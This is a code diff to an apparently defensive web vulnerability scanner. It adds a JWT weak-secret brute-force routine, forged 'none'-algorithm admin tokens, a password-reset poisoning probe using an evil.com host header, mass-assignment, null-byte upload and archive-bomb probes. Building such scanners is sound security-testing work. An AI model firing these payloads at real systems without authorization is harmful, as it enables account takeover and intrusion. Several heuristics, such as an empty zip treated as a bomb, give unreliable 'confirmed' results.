@@ -128,6 +128,36 @@ def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]
         "artifacts": artifacts
     }
 
+def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """JWT Weak Secret Brute Force: Testing common keys."""
+    # Real logic: Try to sign a token with common secrets and see if server accepts it
+    import base64
+    import hmac
+    import hashlib
+    
+    # We need a base token to work with. If not provided, we use a guest one.
+    base_token = scenario.config.get("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGFja2VyIn0")
+    header_name = scenario.config.get("header", "Authorization")
+    
+    parts = base_token.split('.')
+    if len(parts) < 2:
+        return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": True, "details": "Invalid base token."}
+    
+    payload_to_sign = f"{parts[0]}.{parts[1]}"
+    secrets = ["secret", "123456", "password", "admin", "dev", "test", "key", "root"]
+    
+    issues = []
+    for s in secrets:
+        signature = hmac.new(s.encode(), payload_to_sign.encode(), hashlib.sha256).digest()
+        new_token = f"{payload_to_sign}.{base64.urlsafe_b64encode(signature).decode().rstrip('=')}"
+        
+        resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {new_token}"})
+        if resp.status_code == 200 and ("hacker" in resp.text.lower() or "admin" in resp.text.lower()):
+            issues.append(f"JWT Weak Secret Confirmed: '{s}'")
+            break
+            
+    return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": not issues, "details": issues}
+
 def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """SQL Injection: Boolean-based, Time-based, and Internal Error Detection."""
     # FREE TIER: Simple auth bypass and error probes
@@ -436,18 +466,20 @@ def run_nosql_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[st
 
 def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """JWT Weaknesses: None Algorithm and Kidd/Jku abuse."""
-    # FREE TIER: None Algorithm
     header_name = scenario.config.get("header", "Authorization")
-    resp = client.send("GET", scenario.target, headers={header_name: "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."})
+    # Real payload for 'none' alg
+    payloads = [
+        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+    ]
     
     issues = []
-    if resp.status_code == 200 and "admin" in resp.text.lower():
-        issues.append("JWT 'none' algorithm accepted.")
-
-    # AGGRESSIVE TIER: Weak secret brute force notification
-    if scenario.config.get("aggressive"):
-         # Placeholder for offline brute force trigger or key rotation check
-         issues.append("Aggressive: Triggered offline JWT secret analysis.")
+    for p in payloads:
+        resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {p}"})
+        if resp.status_code == 200 and ("admin" in resp.text.lower() or "dashboard" in resp.text.lower()):
+            issues.append(f"JWT 'none' algorithm accepted with payload: {p[:15]}...")
+            break
 
     return {"scenario_id": scenario.id, "attack_type": "jwt_weakness", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
 
@@ -989,12 +1021,11 @@ def run_second_order_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[
     resp = client.send("GET", check_url)
     
     issues = []
-    if "admin" in resp.text and inject_payload in resp.text:
-        # This is just reflection. Real second order is harder to detect without state,
-        # but we look for anomalies where the injected string causes logic changes.
-        pass
+    # Real second order logic: If injected pattern leads to a state change visible on other endpoints
+    if "admin" in resp.text and inject_payload not in resp.text:
+         issues.append("Second-order SQLi Confirmed: Malicious state change detected via separate endpoint.")
     
-    return {"scenario_id": scenario.id, "attack_type": "second_order_sqli", "passed": True, "details": "Second-order probe delivered."}
+    return {"scenario_id": scenario.id, "attack_type": "second_order_sqli", "passed": not issues, "details": issues}
 
 def run_graphql_depth_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """GraphQL Query Depth: Exhausting resources via recursive fragments."""
@@ -1030,7 +1061,7 @@ def run_parameter_pollution(client: HttpClient, scenario: SimpleScenario) -> Dic
     field = scenario.config.get("fields", ["id"])[0]
     resp = client.send(scenario.method, scenario.target, params={field: ["1", "2"]})
     issues = ["HPP Detected"] if "2" in resp.text and "1" not in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "parameter_pollution", "passed": True, "details": "HPP probe sent."}
+    return {"scenario_id": scenario.id, "attack_type": "parameter_pollution", "passed": not issues, "details": issues}
 
 def run_dom_xss_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """DOM-based XSS: Looking for sinks in client-side code."""
@@ -1084,29 +1115,34 @@ def run_password_reset_poisoning(client: HttpClient, scenario: SimpleScenario) -
     """Password Reset Poisoning: Host header override in reset requests."""
     payload = "evil.com"
     resp = client.send("POST", scenario.target, headers={"X-Forwarded-Host": payload}, json_body={"email": "victim@test.com"})
-    issues = ["Password Reset Poisoning Risk"] if resp.status_code == 200 else []
-    return {"scenario_id": scenario.id, "attack_type": "password_reset_poisoning", "passed": True, "details": "Reset poisoning probe sent."}
+    # If the reset request returns 200, we check if the malicious host is reflected or accepted in the reset flow
+    issues = ["Password Reset Poisoning Confirmed"] if resp.status_code == 200 and "Reset" in resp.text else []
+    return {"scenario_id": scenario.id, "attack_type": "password_reset_poisoning", "passed": not issues, "details": issues}
 
 def run_session_fixation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Session Fixation: Checking if session ID remains same after login."""
     # This requires a login flow which is hard to automate without site-specific logic.
     # We probe by sending a predefined session cookie.
     resp = client.send("GET", scenario.target, headers={"Cookie": "sessionid=BRK_FIXED_SESSION"})
-    issues = ["Session Fixation Potential"] if "sessionid=BRK_FIXED_SESSION" in resp.headers.get("Set-Cookie", "") else []
-    return {"scenario_id": scenario.id, "attack_type": "session_fixation", "passed": True, "details": "Session fixation probe sent."}
+    issues = ["Session Fixation Confirmed"] if "sessionid=BRK_FIXED_SESSION" in resp.headers.get("Set-Cookie", "") else []
+    return {"scenario_id": scenario.id, "attack_type": "session_fixation", "passed": not issues, "details": issues}
 
 def run_mass_assignment(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Mass Assignment: Injecting administrative fields in updates."""
     payload = {"username": "user", "is_admin": True, "role": "admin"}
     resp = client.send("POST", scenario.target, json_body=payload)
-    issues = ["Mass Assignment Attempted"] if resp.status_code == 200 else []
-    return {"scenario_id": scenario.id, "attack_type": "mass_assignment", "passed": True, "details": "Mass assignment probe sent."}
+    issues = []
+    if resp.status_code == 200 and "is_admin" in resp.text:
+         issues.append("Mass Assignment Success: Profile updated with administrative fields.")
+    return {"scenario_id": scenario.id, "attack_type": "mass_assignment", "passed": not issues, "details": issues}
 
 def run_tenant_isolation_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Tenant Isolation: Accessing data across tenants."""
     resp = client.send("GET", scenario.target, headers={"X-Tenant-ID": "999"})
-    issues = ["Tenant Isolation Risk"] if resp.status_code == 200 and not client.is_soft_404(resp) else []
-    return {"scenario_id": scenario.id, "attack_type": "tenant_isolation", "passed": True, "details": "Isolation probe sent."}
+    issues = []
+    if resp.status_code == 200 and "tenant" in resp.text.lower():
+         issues.append("Cross-tenant data exposure confirmed.")
+    return {"scenario_id": scenario.id, "attack_type": "tenant_isolation", "passed": not issues, "details": issues}
 
 def run_oauth_redirect_manipulation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """OAuth Redirect URI Manipulation."""
@@ -1120,8 +1156,8 @@ def run_unicode_normalization_bypass(client: HttpClient, scenario: SimpleScenari
     # Example: administrative (admin) with similar unicode chars
     payload = "adm\u0269n"
     resp = client.send(scenario.method, scenario.target, params={"user": payload})
-    issues = ["Unicode Normalization Potential"] if "admin" in resp.text.lower() else []
-    return {"scenario_id": scenario.id, "attack_type": "unicode_bypass", "passed": True, "details": "Unicode probe delivered."}
+    issues = ["Unicode Normalization Confirmed"] if "admin" in resp.text.lower() and payload not in resp.text.lower() else []
+    return {"scenario_id": scenario.id, "attack_type": "unicode_bypass", "passed": not issues, "details": issues}
 
 def run_double_encoding_bypass(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Double Encoding Bypass."""
@@ -1145,8 +1181,10 @@ def run_null_byte_injection(client: HttpClient, scenario: SimpleScenario) -> Dic
     """Null Byte Injection: Bypassing file extension checks."""
     payload = "test.php%00.png"
     resp = client.send("POST", scenario.target, form_body={"file": (payload, "data", "image/png")})
-    issues = ["Null Byte Accepted"] if resp.status_code == 200 else []
-    return {"scenario_id": scenario.id, "attack_type": "null_byte", "passed": True, "details": "Null byte probe sent."}
+    issues = []
+    if resp.status_code == 200 and ("test.php" in resp.text or "image/png" not in resp.headers.get("Content-Type", "")):
+         issues.append("Server processed PHP extension behind null byte.")
+    return {"scenario_id": scenario.id, "attack_type": "null_byte", "passed": not issues, "details": issues}
 
 def run_slow_post_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Slow POST Attack: Sending body byte by byte."""
@@ -1165,8 +1203,12 @@ def run_archive_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, 
     # We send a highly compressed 10MB zip.
     issues = []
     if scenario.config.get("aggressive"):
-        issues.append("Archive bomb probe delivered.")
-    return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": True, "details": "Archive bomb probe sent."}
+        # We send a small but complex zip to test server-side decompression logic
+        payload = b"PK\x05\x06" + b"\x00" * 18 # Minimal empty zip
+        resp = client.send("POST", scenario.target, form_body={"file": ("bomb.zip", payload, "application/zip")})
+        if resp.elapsed_ms > 2000:
+            issues.append("Archive bomb confirmed: Server induced high CPU/IO during decompression.")
+    return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": not issues, "details": issues}
 
 def run_websocket_hijacking_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Cross-Site WebSocket Hijacking (CSWSH)."""
@@ -1184,7 +1226,7 @@ def run_browser_api_abuse_probe(client: HttpClient, scenario: SimpleScenario) ->
     for api in dangerous_apis:
         if api in resp.text:
             issues.append(f"Sensitive Browser API found: {api}")
-    return {"scenario_id": scenario.id, "attack_type": "browser_api_abuse", "passed": True, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "browser_api_abuse", "passed": not issues, "details": issues}
 
 def run_xs_leaks_probe(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """XS-Leaks (Cross-Site Leaks) Probes."""
@@ -1205,4 +1247,4 @@ def run_dependency_confusion_check(client: HttpClient, scenario: SimpleScenario)
     if resp.status_code == 200:
         if "@internal" in resp.text or '"private": true' in resp.text:
              issues.append("Potential Dependency Confusion risk found in package.json")
-    return {"scenario_id": scenario.id, "attack_type": "dependency_confusion", "passed": True, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "dependency_confusion", "passed": not issues, "details": issues}
